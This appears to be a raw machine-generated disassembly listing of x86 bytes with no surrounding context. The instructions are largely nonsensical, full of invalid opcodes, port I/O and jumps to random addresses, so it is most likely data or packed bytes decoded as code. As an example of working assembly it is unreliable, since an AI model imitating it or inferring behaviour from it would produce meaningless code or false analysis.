  418d5f:	fcmovu st,st(3)
  418d61:	aad    0xe3
  418d63:	xchg   esi,eax
  418d64:	mov    bh,0xc
  418d66:	sub    ah,dh
  418d68:	xchg   DWORD PTR [ebx-0x23],ebx
  418d6b:	daa    
  418d6c:	fimul  WORD PTR [esi+0x1e24e153]
  418d72:	jmp    0x418d98
  418d74:	adc    DWORD PTR [esi],eax
  418d76:	shl    edx,cl
  418d78:	call   0x1b16:0x3dbe7b01
  418d7f:	adc    edx,DWORD PTR [esi]
  418d81:	cmp    esp,DWORD PTR [edi-0x42d70827]
  418d87:	leave  
  418d88:	outs   dx,BYTE PTR ds:[esi]
  418d89:	icebp  
  418d8a:	sub    BYTE PTR [ecx],dl
  418d8c:	(bad)  
  418d8d:	sbb    edx,edi
  418d8f:	imul   esi,DWORD PTR [esi-0xcb9af14],0xffffffc9
  418d96:	(bad)  
  418d97:	pop    esi
  418d98:	cli    
  418d99:	jno    0x418dc1
  418d9b:	(bad)  
  418d9c:	jp     0x418de0
  418d9e:	js     0x418d68
  418da0:	loopne 0x418d7d
  418da2:	mov    edx,edx
  418da4:	and    eax,0x3ca05b20
  418da9:	ror    ebx,0x3a
  418dac:	sbb    BYTE PTR ds:0x57bfd699,dl
  418db2:	inc    ecx
  418db3:	ja     0x418de3
  418db5:	add    edi,eax
  418db7:	pop    esi
  418db8:	pop    ss
  418db9:	or     eax,0x2642524b
  418dbe:	shl    BYTE PTR [ebp-0x32240a90],cl
  418dc4:	cld    
  418dc5:	add    eax,0x644e6e7e
  418dca:	and    ah,BYTE PTR [edx-0x72235fd8]
  418dd0:	test   al,0xec
  418dd2:	scas   al,BYTE PTR es:[edi]
  418dd3:	sbb    BYTE PTR [ebx+ebp*4],ah
  418dd6:	imul   ebp,ebx,0x21b4061d
  418ddc:	dec    ebp
  418ddd:	and    esp,edx
  418ddf:	push   edx
  418de0:	dec    edx
  418de1:	leave  
  418de2:	xor    al,BYTE PTR [ecx-0x2755513e]
  418de8:	mov    edx,0x4dfbb099
  418ded:	jnp    0x418db3
  418def:	lds    esp,FWORD PTR [edx+0x52]
  418df2:	jge    0x418e5a
  418df4:	sub    eax,0x7125353a
  418df9:	out    0xcc,eax
  418dfb:	gs (bad) 
  418dfd:	xchg   ebp,eax
  418dfe:	pop    DWORD PTR [ecx]
  418e00:	and    bh,al
  418e02:	je     0x418dd0
  418e04:	(bad)  [ebx]
  418e06:	cwde   
  418e07:	ins    DWORD PTR es:[edi],dx
  418e08:	or     eax,0xe72de058
  418e0d:	shl    DWORD PTR [edx],1
  418e0f:	pop    edi
	...
  418e74:	push   cs
  418e75:	bnd call 0xde7c8aab
  418e7b:	dec    dl
  418e7d:	leave  
  418e7e:	and    ah,BYTE PTR [edx-0x7]
  418e81:	pop    eax
  418e82:	push   eax
  418e83:	call   0x429638
  418e88:	add    al,0x1
  418e8a:	add    BYTE PTR [eax],al
  418e8c:	rcl    ah,0x1c
  418e8f:	retf   
  418e90:	jbe    0x418ed0
  418e92:	shl    BYTE PTR [ecx-0x69],cl
  418e95:	out    0xe3,al
  418e97:	mov    ds:0xa82199a8,al
  418e9c:	cmp    DWORD PTR [ecx+0x65],ecx
  418e9f:	aaa    
  418ea0:	jmp    0xfcc2:0xac852b33
  418ea7:	jno    0x418ec8
  418ea9:	mov    edi,0xac8d815
  418eae:	sub    al,BYTE PTR [eax-0x10]
  418eb1:	sti    
  418eb2:	dec    edi
  418eb3:	outs   dx,DWORD PTR ds:[esi]
  418eb4:	lahf   
  418eb5:	and    BYTE PTR [eax+0x5304fb05],0x4d
  418ebc:	pop    edi
  418ebd:	inc    ecx
  418ebe:	xchg   edi,eax
  418ebf:	test   DWORD PTR [eax-0x52312b72],edi
  418ec5:	and    BYTE PTR [edi-0x42dd8925],0x1d
  418ecc:	jnp    0x418ea2
  418ece:	fdiv   st,st(5)
  418ed0:	push   cs
  418ed1:	jecxz  0x418edf
  418ed3:	leave  
  418ed4:	and    al,cl
  418ed6:	(bad)  
  418ed7:	scas   eax,DWORD PTR es:[edi]
  418ed8:	sets   dh
  418edb:	dec    edx
  418edc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418edd:	and    dl,BYTE PTR [ecx+0x37]
  418ee0:	dec    esi
  418ee1:	jno    0x418ec5
  418ee3:	jbe    0x418ebb
  418ee5:	das    
  418ee6:	inc    esp
  418ee7:	std    
  418ee8:	outs   dx,BYTE PTR ds:[esi]
  418ee9:	mov    bh,0x48
  418eeb:	xor    al,0xd5
  418eed:	pop    es
  418eee:	and    BYTE PTR [edi-0x4d],0x18
  418ef2:	mov    eax,ds:0x71e61e4d
  418ef8:	int3   
  418ef9:	(bad)  
  418efa:	call   0xb836:0xcf206dcc
  418f01:	bound  esi,QWORD PTR [ebp-0x709ea7b5]
  418f07:	adc    edx,DWORD PTR [ebx]
  418f09:	pop    edi
  418f0a:	nop
  418f0b:	scas   eax,DWORD PTR es:[edi]
  418f0c:	pminsw mm6,QWORD PTR [ebp+0x18c237c]
  418f13:	dec    eax
  418f14:	inc    ebp
  418f15:	mov    eax,ds:0x7d0bca61
  418f1a:	mov    esp,0x54a78999
  418f1f:	pop    esp
  418f20:	fadd   st,st(1)
  418f22:	add    eax,0x755cb79d
  418f27:	pushf  
  418f28:	mov    ebp,0x8e37fb27
  418f2d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418f2e:	xor    eax,0x80d47884
  418f33:	aaa    
  418f34:	mov    cl,0x29
  418f36:	mov    ds:0x9a0bbde4,al
  418f3b:	ins    DWORD PTR es:[edi],dx
  418f3c:	out    dx,al
  418f3d:	stc    
  418f3e:	xchg   esi,eax
  418f3f:	ins    BYTE PTR es:[edi],dx
  418f40:	dec    esi
  418f41:	and    al,0xf4
  418f43:	dec    edx
  418f44:	cmp    eax,0x2a6a9359
  418f49:	clc    
  418f4a:	or     al,0x25
  418f4c:	mov    BYTE PTR [ecx-0x34],dl
  418f4f:	cli    
  418f50:	enter  0xbcad,0xf8
  418f54:	cmp    ecx,DWORD PTR [edi]
  418f56:	ror    ah,cl
  418f58:	xchg   BYTE PTR [esi-0x15],bh
  418f5b:	push   esi
  418f5c:	hlt    
  418f5d:	leave  
  418f5e:	jmp    0x5a13ec55
  418f63:	pusha  
  418f64:	mov    ds:0xc1beda27,al
  418f69:	fsubr  DWORD PTR [eax-0x3e]
  418f6c:	or     DWORD PTR [edi],edx
  418f6e:	(bad)  
  418f6f:	fist   DWORD PTR [ecx-0x2a120e68]
  418f75:	mov    ds:0x43076eb8,al
  418f7a:	jbe    0x418f22
  418f7c:	mov    WORD PTR [esi-0x7c],ss
  418f7f:	push   ecx
  418f80:	fdivr  QWORD PTR [edx+0x25]
  418f83:	sbb    al,0x83
  418f85:	inc    edi
  418f86:	(bad)  [edi-0x25162d2f]
  418f8c:	(bad)
  418f8f:	ret    
	...
  418ff4:	sbb    al,0x97
  418ff6:	in     al,0x47
  418ff8:	out    dx,eax
  418ff9:	ja     0x418fba
  418ffb:	fild   WORD PTR [ecx-0x12150e59]
  419001:	arpl   WORD PTR ds:0x108b45f,di
  419007:	add    BYTE PTR [ecx+eax*1],al
  41900a:	add    BYTE PTR [eax],al
  41900c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41900d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41900e:	pop    es
  41900f:	repnz adc ecx,DWORD PTR [ecx]
  419012:	dec    edi
  419013:	xor    dh,BYTE PTR ds:[edi-0x6a]
  419017:	in     al,dx
  419018:	adc    BYTE PTR [edi],bh
  41901a:	mov    bh,0xac
  41901c:	cmp    eax,0xe29b13c4
  419021:	xchg   DWORD PTR ds:0x716c8952,edi
  419027:	push   0xffffffa9
  419029:	xchg   esi,eax
  41902a:	adc    al,0x49
  41902c:	push   eax
  41902d:	pop    edi
  41902e:	pop    ecx
  41902f:	sub    dh,al
  419031:	jno    0x419033
  419033:	mov    ch,0xaa
  419035:	mov    ds:0x487df1fb,al
  41903a:	loop   0x418fd6
  41903c:	mov    eax,0xcdc8fe2e
  419041:	push   ebx
  419042:	inc    DWORD PTR [edx]
  419044:	mov    bl,0x67
  419046:	push   0x758a51e4
  41904b:	bound  esp,QWORD PTR [edi+0x1f]
  41904e:	jmp    0x419027
  419050:	lahf   
  419051:	cmp    BYTE PTR [esi+edi*4-0x5d],bh
  419055:	cmp    DWORD PTR [edi],ebp
  419057:	pop    esp
  419058:	outs   dx,DWORD PTR ds:[esi]
  419059:	mov    ebp,0xe557a68c
  41905e:	inc    edx
  41905f:	jp     0x41902f
  419061:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419062:	add    edi,esi
  419064:	sbb    DWORD PTR [ecx+0x3],esp
  419067:	push   edi
  419068:	mov    edx,0xf02cbfab
  41906d:	lahf   
  41906e:	icebp  
  41906f:	std    
  419070:	retf   0x4cd9
  419073:	(bad)  
  419074:	sbb    DWORD PTR [edi-0x1ba86e61],ebx
  41907a:	rol    BYTE PTR ds:0x9725f806,cl
  419080:	sbb    cl,BYTE PTR [esi-0x6e42f9b6]
  419086:	xor    bh,al
  419088:	out    0xc5,al
  41908a:	loopne 0x4190b7
  41908c:	mov    ecx,edx
  41908e:	cmp    esp,esi
  419090:	cmp    eax,0x1b2b6e26
  419095:	or     DWORD PTR [edx-0x74960c8f],0xe5a9fa0
  41909f:	scas   ax,WORD PTR es:[edi]
  4190a1:	xlat   BYTE PTR ds:[ebx]
  4190a2:	outs   dx,DWORD PTR ds:[esi]
  4190a3:	fbld   TBYTE PTR [edx-0x74f541b8]
  4190a9:	ins    BYTE PTR es:[edi],dx
  4190aa:	in     al,dx
  4190ab:	inc    edi
  4190ac:	imul   ecx,DWORD PTR [esi+0x39bd109d],0x27
  4190b3:	clc    
  4190b4:	fiadd  WORD PTR [ecx-0x3d]
  4190b7:	mov    ds:0x1fdfa095,al
  4190bc:	mov    ebx,0xdfd2b411
  4190c1:	jmp    DWORD PTR [ebp+0x661124c7]
  4190c7:	pop    ebx
  4190c8:	nop
  4190c9:	jne    0x419055
  4190cb:	sar    BYTE PTR [edi],0xa6
  4190ce:	mov    dh,0x52
  4190d0:	arpl   cx,si
  4190d2:	pop    edx
  4190d3:	lahf   
  4190d4:	repz cs leave 
  4190d7:	fst    st(5)
  4190d9:	inc    eax
  4190da:	push   eax
  4190db:	jecxz  0x419067
  4190dd:	or     ebx,ecx
  4190df:	call   0x265d61fc
  4190e4:	sub    dl,bh
  4190e6:	jle    0x4190b9
  4190e8:	pop    edi
  4190e9:	add    BYTE PTR [edi-0x72],cl
  4190ec:	inc    ebp
  4190ed:	inc    esi
  4190ee:	cdq    
  4190ef:	lock (bad) 
  4190f2:	jne    0x41911d
  4190f4:	pop    ss
  4190f5:	xor    esp,ecx
  4190f7:	mov    edx,0xca7fa16c
  4190fc:	fist   DWORD PTR [esi]
  4190fe:	hlt    
  4190ff:	fdivp  st(5),st
  419101:	das    
  419102:	fadd   QWORD PTR [ebx-0x26]
  419105:	jmp    DWORD PTR [esi]
  419107:	add    eax,0xecca384
  41910c:	lds    ebp,FWORD PTR [ecx+ebx*2+0x21]
	...
  419174:	scas   eax,DWORD PTR es:[edi]
  419175:	test   DWORD PTR [esi-0xa441be],ebx
  41917b:	in     eax,dx
  41917c:	inc    esi
  41917d:	push   0x4d
  41917f:	or     bl,cl
  419181:	push   0x4b
  419183:	mov    ebx,0x109b8
  419188:	add    al,0x1
  41918a:	add    BYTE PTR [eax],al
  41918c:	(bad)  [ebx-0x1608894a]
  419192:	push   0x68
  419194:	sbb    DWORD PTR [edx+0x54701540],edx
  41919a:	pusha  
  41919b:	add    ebp,DWORD PTR [ebp-0x7d]
  41919e:	loop   0x41919e
  4191a0:	out    0x6e,eax
  4191a2:	out    dx,eax
  4191a3:	out    0x62,al
  4191a5:	pop    ecx
  4191a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4191a7:	daa    
  4191a8:	sbb    ebx,DWORD PTR ds:0xab89b7c7
  4191ae:	sar    esp,0x1e
  4191b1:	popa   
  4191b2:	pop    edi
  4191b3:	mov    gs:0xdaed6f37,eax
  4191b9:	popf   
  4191ba:	ret    
  4191bb:	push   eax
  4191bc:	neg    BYTE PTR [esi-0xe]
  4191bf:	xchg   ebp,eax
  4191c0:	shr    BYTE PTR [ebp+0xc],0x70
  4191c4:	push   eax
  4191c5:	sti    
  4191c6:	fmul   QWORD PTR [ebp+0x3f]
  4191c9:	xor    ecx,DWORD PTR [esi-0xf]
  4191cc:	cdq    
  4191cd:	or     DWORD PTR [ebp-0x5a],edi
  4191d0:	out    dx,eax
  4191d1:	neg    BYTE PTR [edx-0x2c]
  4191d4:	cmp    al,0xc5
  4191d6:	pop    ecx
  4191d8:	mov    ebp,0xb6b64c7e
  4191dd:	mov    es,WORD PTR [edx]
  4191df:	and    eax,0xdcf45976
  4191e4:	test   DWORD PTR [ebp+0x143761b0],0x91131ac5
  4191ee:	push   0xffffffac
  4191f0:	xlat   BYTE PTR ds:[ebx]
  4191f1:	cmp    BYTE PTR [ebx-0x1c27c315],dl
  4191f7:	jle    0x419224
  4191f9:	xchg   esp,eax
  4191fa:	cmp    eax,0x77f63f14
  4191ff:	pushf  
  419200:	in     eax,0xc4
  419202:	arpl   WORD PTR [esi+0x4eaaf351],di
  419208:	mov    eax,0x1046035f
  41920d:	push   ecx
  41920e:	or     al,0x52
  419210:	sub    eax,0xb5f568c5
  419215:	scas   al,BYTE PTR es:[edi]
  419216:	in     eax,dx
  419217:	push   es
  419218:	sahf   
  419219:	adc    edi,0xd754891b
  41921f:	pop    ebp
  419220:	(bad)
  419224:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419225:	pop    ds
  419226:	mov    eax,ds:0x2e27e52a
  41922b:	sbb    ch,BYTE PTR [edi+esi*2+0x10d4956]
  419232:	push   esp
  419233:	bound  edi,QWORD PTR [ecx-0x4d5606ec]
  419239:	ins    BYTE PTR es:[edi],dx
  41923a:	outs   dx,BYTE PTR ds:[esi]
  41923b:	jecxz  0x4192a9
  41923d:	in     eax,dx
  41923e:	iret   
  41923f:	add    edi,DWORD PTR [eax-0x43]
  419242:	call   0xc742:0x9a8c3cb9
  419249:	mov    eax,ds:0xcbbe08de
  41924e:	mov    eax,cs
  419250:	xchg   edi,eax
  419251:	outs   dx,BYTE PTR ds:[esi]
  419252:	inc    ebp
  419253:	xchg   BYTE PTR ds:0x9d52bdaa,bh
  419259:	outs   dx,DWORD PTR ds:[esi]
  41925a:	int3   
  41925b:	xchg   edi,eax
  41925c:	cmc    
  41925d:	popf   
  41925e:	fwait
  41925f:	in     eax,0x97
  419261:	sub    DWORD PTR fs:[edi+0x28b34221],ebp
  419268:	and    DWORD PTR [eax],eax
  41926a:	and    esp,edx
  41926c:	inc    ebx
  41926d:	jne    0x419290
  41926f:	xchg   esi,eax
  419270:	daa    
  419271:	popa   
  419272:	repz cld 
  419274:	lods   eax,DWORD PTR ds:[esi]
  419275:	mov    cl,0xe1
  419277:	imul   DWORD PTR [esi-0x59]
  41927a:	mov    ds,edx
  41927c:	inc    eax
  41927d:	lahf   
  41927e:	pop    ebp
  41927f:	test   DWORD PTR [edx+0x69],ecx
  419282:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419283:	dec    ebx
  419284:	ret    0x491f
  419287:	test   eax,0x807c60f0
  41928c:	test   DWORD PTR [eax+0x46],eax
  41928f:	fadd   QWORD PTR [eax]
	...
  4192f1:	add    BYTE PTR [eax],al
  4192f3:	add    BYTE PTR [eax-0xcc4519],ah
  4192f9:	jg     0x4192a4
  4192fb:	neg    eax
  4192fd:	pop    ss
  4192fe:	daa    
  4192ff:	inc    edi
  419300:	(bad)  
  419301:	in     eax,0x12
  419303:	dec    esp
  419304:	mov    esp,0x400010a
  419309:	add    DWORD PTR [eax],eax
  41930b:	add    BYTE PTR [ebx+eax*4],dl
  41930e:	add    ebp,esp
  419310:	xlat   BYTE PTR ds:[ebx]
  419311:	push   ds
  419312:	pop    esp
  419313:	mov    cl,0x25
  419315:	shl    BYTE PTR [edx+0x36],0xe1
  419319:	loopne 0x419336
  41931b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41931c:	inc    edx
  41931d:	add    eax,0xd4e3238f
  419322:	xchg   ebx,eax
  419323:	or     DWORD PTR [esp+ecx*1-0x14b87c3f],eax
  41932a:	jbe    0x4192ef
  41932c:	add    BYTE PTR [eax-0x7f],dl
  41932f:	retf   0x873a
  419332:	mov    ecx,0x59bc0283
  419337:	sub    cl,BYTE PTR [ebp+0x62]
  41933a:	je     0x41932a
  41933c:	xchg   bh,bl
  41933e:	mov    ecx,0x779d3098
  419343:	sbb    eax,0xdc1baf5b
  419348:	adc    BYTE PTR [ecx],ch
  41934a:	call   edi
  41934c:	push   ecx
  41934d:	jp     0x4192d0
  41934f:	add    al,ch
  419351:	mov    al,0x4b
  419353:	aas    
  419354:	in     eax,dx
  419355:	int3   
  419356:	mov    ebx,0xc909be34
  41935b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41935c:	and    ah,BYTE PTR ds:0x2a2f5ec8
  419362:	and    DWORD PTR [ebp+0x25],esi
  419365:	sbb    BYTE PTR [ecx+ecx*8+0x67],al
  419369:	sbb    DWORD PTR [edx-0x192d6222],esp
  41936f:	aad    0x49
  419371:	popa   
  419372:	sub    eax,0xf39ce6a2
  419377:	xchg   ecx,eax
  419378:	cmp    al,0x88
  41937a:	icebp  
  41937b:	mov    ebx,0x549f7682
  419380:	adc    dl,BYTE PTR [ecx+0x3f]
  419383:	fnstsw WORD PTR [esi-0x23]
  419386:	adc    esp,ebx
  419388:	aaa    
  419389:	cld    
  41938a:	out    dx,eax
  41938b:	jae    0x4193f2
  41938d:	fimul  DWORD PTR [ecx-0x5a65775b]
  419393:	lock adc ebp,DWORD PTR [edx-0x9]
  419397:	out    dx,al
  419398:	retf   
  419399:	jmp    FWORD PTR [ebp+0x20]
  41939c:	sahf   
  41939d:	fsubr  DWORD PTR [ebx-0x58]
  4193a0:	dec    ebx
  4193a1:	loope  0x41936e
  4193a3:	xlat   BYTE PTR ds:[ebx]
  4193a4:	jmp    0x1199:0xc2a2e1f
  4193ab:	std    
  4193ac:	xchg   esi,eax
  4193ad:	add    al,BYTE PTR [edi-0x65]
  4193b0:	out    0xd3,eax
  4193b2:	add    eax,0xc9911550
  4193b7:	(bad)  
  4193b8:	mov    cl,0x44
  4193ba:	xor    eax,0x96ac0448
  4193bf:	sar    bl,1
  4193c1:	lds    esp,FWORD PTR [ebx+0x51]
  4193c4:	mov    edi,0x43665e5a
  4193c9:	ds jns 0x4193a5
  4193cc:	(bad)  
  4193cd:	or     eax,0x34fda2b8
  4193d2:	int3   
  4193d3:	rcr    DWORD PTR [eax+0x394c3744],1
  4193d9:	xor    ah,BYTE PTR [ebp+0x1ea51c04]
  4193df:	cmp    al,0x83
  4193e1:	pop    eax
  4193e2:	fisttp WORD PTR [ecx+ecx*1]
  4193e5:	loopne 0x41939d
  4193e7:	push   ebp
  4193e8:	pop    ebp
  4193e9:	in     eax,dx
  4193ea:	push   ecx
  4193eb:	test   DWORD PTR [ecx+eiz*1],esi
  4193ee:	sub    bh,BYTE PTR [eax+0x4fd86596]
  4193f4:	mov    eax,ds:0x70038a14
  4193f9:	jno    0x419459
  4193fb:	push   es
  4193fc:	and    al,cl
  4193fe:	jle    0x419479
  419400:	rcl    al,0xbf
  419403:	and    DWORD PTR [ecx+0x480fb965],0x2970ee62
  41940d:	cwde   
  41940e:	jo     0x419471
	...
  419474:	cmp    eax,0xed3a6998
  419479:	sti    
  41947a:	jg     0x41941b
  41947c:	cmp    ebx,esi
  41947e:	je     0x419446
  419480:	jmp    0x10b:0xc08f54aa
  419487:	add    BYTE PTR [ecx+eax*1],al
  41948a:	add    BYTE PTR [eax],al
  41948c:	scas   eax,DWORD PTR es:[edi]
  41948d:	xchg   ecx,eax
  41948e:	sub    esp,DWORD PTR [edi+0x38374622]
  419494:	and    eax,0xddb9eaa7
  419499:	xchg   ebp,eax
  41949a:	mov    al,0x99
  41949c:	aam    0xbf
  41949e:	dec    edx
  41949f:	pop    esp
  4194a0:	jne    0x41942b
  4194a2:	or     eax,0x5335dc53
  4194a7:	(bad)  
  4194a8:	sub    ecx,DWORD PTR [ebp-0x25387626]
  4194ae:	and    al,0x52
  4194b0:	jmp    0xffc3:0x3d042b7a
  4194b7:	(bad)  
  4194b8:	cmc    
  4194b9:	inc    edx
  4194ba:	fdivp  st(2),st
  4194bc:	repz mov dl,BYTE PTR [eax-0x64e50023]
  4194c3:	dec    esp
  4194c4:	test   ah,bl
  4194c6:	(bad)  
  4194c7:	out    dx,al
  4194c8:	push   esi
  4194c9:	out    dx,eax
  4194ca:	jae    0x419517
  4194cc:	xchg   esi,eax
  4194cd:	fmul   st,st(1)
  4194cf:	mov    dl,0x81
  4194d1:	lea    ebp,ds:0xda120541
  4194d7:	dec    ebx
  4194d8:	imul   edi,DWORD PTR [edx],0x4d312abf
  4194de:	mov    ah,0x4f
  4194e0:	stc    
  4194e1:	fsubr  DWORD PTR ds:0x9bb59269
  4194e7:	ficom  WORD PTR [edi-0x4172ebd8]
  4194ed:	(bad)  
  4194ee:	jbe    0x419568
  4194f0:	cmp    ebx,esp
  4194f2:	rol    BYTE PTR [ecx-0x1004780e],0xdc
  4194f9:	outs   dx,DWORD PTR ds:[esi]
  4194fa:	fwait
  4194fb:	ins    BYTE PTR es:[edi],dx
  4194fc:	push   edx
  4194fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4194fe:	inc    edx
  4194ff:	neg    DWORD PTR [esi-0x58]
  419502:	icebp  
  419503:	retf   0xcfcf
  419506:	lock jge 0x41956b
  419509:	cwde   
  41950a:	int3   
  41950b:	fidivr WORD PTR [edx+0x13]
  41950e:	rol    ah,1
  419510:	int    0xfc
  419512:	mov    eax,0x826d8963
  419517:	inc    edx
  419518:	cli    
  419519:	fcmovbe st,st(6)
  41951b:	leave  
  41951c:	sbb    ah,ch
  41951e:	jl     0x419528
  419520:	(bad)  
  419522:	icebp  
  419523:	cmp    al,0x3a
  419525:	dec    edx
  419526:	mov    cl,0xc3
  419528:	mov    dl,0x64
  41952a:	mov    bh,0x9c
  41952c:	jo     0x4194d3
  41952e:	push   eax
  41952f:	dec    ebx
  419530:	push   esp
  419531:	repnz pop eax
  419533:	or     BYTE PTR [esi-0x45],ch
  419536:	ror    DWORD PTR [eax+0x30467cf1],cl
  41953c:	and    al,0x2
  41953e:	jae    0x4194f1
  419540:	adc    edi,DWORD PTR [edx]
  419542:	sub    bl,BYTE PTR [eax-0x37]
  419545:	dec    ebp
  419546:	inc    edi
  419547:	(bad)  
  419548:	mov    WORD PTR [edi-0x62cf6fba],ss
  41954e:	outs   dx,BYTE PTR ds:[esi]
  41954f:	jl     0x41951d
  419551:	shr    DWORD PTR [ebx],0xf8
  419554:	sub    esp,edi
  419556:	sar    DWORD PTR [eax+0x49],0x28
  41955a:	or     eax,0xa1af747c
  41955f:	dec    ebp
  419560:	fdiv   QWORD PTR [eax+0xfc8cb53]
  419566:	(bad)  
  419567:	test   al,0x66
  419569:	mov    ds:0x5fa80109,al
  41956e:	std    
  41956f:	rcr    BYTE PTR [ecx-0x721089bc],cl
  419575:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419576:	test   al,0x6c
  419578:	push   esi
  419579:	je     0x4195a3
  41957b:	xor    DWORD PTR [ecx-0x305428c3],esi
  419581:	pop    ds
  419582:	sbb    bl,BYTE PTR [ecx]
  419584:	test   DWORD PTR [ecx+ebp*4],eax
  419587:	mov    ch,dl
  419589:	retf   
  41958a:	loopne 0x4195e9
  41958c:	sbb    ch,BYTE PTR [ebx]
  41958e:	loope  0x4195ac
	...
  4195f4:	scas   eax,DWORD PTR es:[edi]
  4195f5:	aam    0x8d
  4195f7:	(bad)  
  4195f8:	(bad)  
  4195f9:	jnp    0x4195ea
  4195fb:	fstp   st(1)
  4195fd:	fcomp  QWORD PTR [ebx+0x2f]
  419600:	adc    DWORD PTR [ecx+0x77],ebp
  419603:	cmp    al,ah
  419605:	or     al,0x1
  419607:	add    BYTE PTR [ecx+eax*1],al
  41960a:	add    BYTE PTR [eax],al
  41960c:	popa   
  41960d:	dec    ebx
  41960e:	jmp    0x1fb851ff
  419613:	sub    al,0x5a
  419615:	je     0x4195a0
  419617:	and    eax,0xb17d9663
  41961c:	in     eax,0xec
  41961e:	fisubr DWORD PTR [ecx+0x6ff97530]
  419624:	mov    dh,0xa3
  419626:	(bad)  
  419627:	fcmovnb st,st(4)
  419629:	adc    eax,0xf1edfa7c
  41962e:	xor    al,0x8b
  419630:	xchg   DWORD PTR [eax],ecx
  419632:	dec    ebx
  419633:	push   ebx
  419634:	sbb    edx,ebx
  419636:	jle    0x419635
  419638:	retf   
  419639:	leave  
  41963a:	repnz push esp
  41963c:	cmp    esi,DWORD PTR [edx-0x5f]
  41963f:	in     eax,dx
  419640:	mov    al,0x16
  419642:	aaa    
  419643:	cmp    dl,bl
  419645:	pmovmskb ebx,mm6
  419648:	pop    esi
  419649:	jecxz  0x419668
  41964b:	lahf   
  41964c:	and    eax,0x78a3fece
  419651:	and    eax,0x1147f7a6
  419656:	imul   ebx,DWORD PTR [edi+edx*2],0x4
  41965a:	adc    al,0x8
  41965c:	sahf   
  41965d:	out    0x1c,eax
  41965f:	xor    ebx,ecx
  419661:	idiv   ebp
  419663:	sub    al,0x4f
  419665:	sub    al,0x1b
  419667:	cli    
  419668:	ss sub eax,eax
  41966b:	repz pusha 
  41966d:	inc    ebp
  41966e:	xchg   ebx,edx
  419670:	(bad)  
  419672:	inc    ebp
  419673:	sub    eax,0xf1742f78
  419678:	pop    edx
  419679:	jmp    0x52ea870b
  41967e:	popf   
  41967f:	mov    esi,0x32ecfc18
  419684:	(bad)  
  419685:	out    dx,al
  419686:	arpl   WORD PTR [edx-0x132a2685],si
  41968c:	xchg   esp,eax
  41968d:	dec    edi
  41968e:	fldcw  WORD PTR [ebx]
  419690:	aad    0x53
  419692:	mov    DWORD PTR [edi+0x66],esi
  419695:	enter  0x430f,0x1a
  419699:	(bad)  
  41969a:	in     al,dx
  41969b:	xchg   edx,eax
  41969c:	fucomi st,st(6)
  41969e:	arpl   WORD PTR [esi],si
  4196a0:	inc    ebx
  4196a1:	neg    DWORD PTR [eax]
  4196a3:	xor    al,0x5c
  4196a5:	test   al,0x2a
  4196a7:	sbb    cl,BYTE PTR [edi]
  4196a9:	adc    DWORD PTR ds:0xf6686ade,ebx
  4196af:	out    dx,eax
  4196b0:	call   0x5669:0x249b6212
  4196b7:	ret    
  4196b8:	lea    eax,[ecx+0x16537c5a]
  4196be:	xlat   BYTE PTR ds:[ebx]
  4196bf:	ror    BYTE PTR [edi+0x2a],0xa6
  4196c3:	call   0x4d36fc17
  4196c8:	cs cs dec edx
  4196cb:	test   eax,0xf7464656
  4196d0:	xor    BYTE PTR [edx-0x42baa974],0x84
  4196d7:	xor    esp,eax
  4196d9:	and    eax,0xb1ef9b01
  4196de:	xchg   esp,eax
  4196df:	pop    ss
  4196e0:	dec    eax
  4196e1:	fabs   
  4196e3:	adc    BYTE PTR [ecx],dh
  4196e5:	mov    dh,0x3f
  4196e7:	or     ch,al
  4196e9:	call   FWORD PTR [ebx-0x22c5b0db]
  4196ef:	mov    bh,ch
  4196f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4196f2:	xchg   ebp,eax
  4196f3:	fwait
  4196f4:	popa   
  4196f5:	mov    dl,0x52
  4196f7:	aaa    
  4196f8:	xchg   ebx,esp
  4196fa:	mov    bl,0xb5
  4196fc:	push   esp
  4196fd:	jp     0x4196ce
  4196ff:	cmp    BYTE PTR [eax+0x5d],0x64
  419703:	push   ebx
  419704:	lahf   
  419705:	lahf   
  419706:	inc    ebx
  419707:	bnd jae 0x41971f
  41970a:	or     dh,cl
  41970c:	scas   al,BYTE PTR es:[edi]
  41970d:	pop    esp
  41970e:	aad    0x54
	...
  419774:	mov    bl,0x3f
  419776:	jno    0x4197dd
  419778:	std    
  419779:	outs   dx,DWORD PTR ds:[esi]
  41977a:	mov    bh,0xff
  41977c:	add    eax,0x38dd0ae
  419781:	pop    ebp
  419782:	(bad)  
  419784:	enter  0x10d,0x0
  419788:	add    al,0x1
  41978a:	add    BYTE PTR [eax],al
  41978c:	jo     0x4197fc
  41978e:	adc    BYTE PTR [ebp+esi*2-0xaafbebb],0xd4
  419796:	mov    ch,0x66
  419798:	cmp    ecx,DWORD PTR [edi+0x28]
  41979b:	cmp    ch,BYTE PTR [ebx]
  41979d:	icebp  
  41979e:	in     al,0x95
  4197a0:	fwait
  4197a1:	cmp    eax,0x78c07880
  4197a6:	lods   eax,DWORD PTR ds:[esi]
  4197a7:	in     al,0x1d
  4197a9:	(bad)
  4197ac:	ins    BYTE PTR es:[edi],dx
  4197ad:	out    dx,eax
  4197ae:	and    al,BYTE PTR [eax+0x5a]
  4197b1:	and    eax,0x860df272
  4197b6:	mov    ah,0xd6
  4197b8:	lock fldcw WORD PTR [ebp+0xd]
  4197bc:	pop    eax
  4197bd:	ficom  DWORD PTR [esi]
  4197bf:	xchg   esi,eax
  4197c0:	out    0xc9,al
  4197c2:	int3   
  4197c3:	leave  
  4197c4:	inc    esi
  4197c5:	jbe    0x41981a
  4197c7:	jb     0x4197d0
  4197c9:	fsub   DWORD PTR [edx-0x721ce346]
  4197cf:	push   0x8aad6e06
  4197d4:	out    0x8,al
  4197d6:	pop    esi
  4197d7:	sbb    esi,ebp
  4197d9:	pop    esp
  4197da:	jns    0x4197ba
  4197dc:	ret    
  4197dd:	pop    ecx
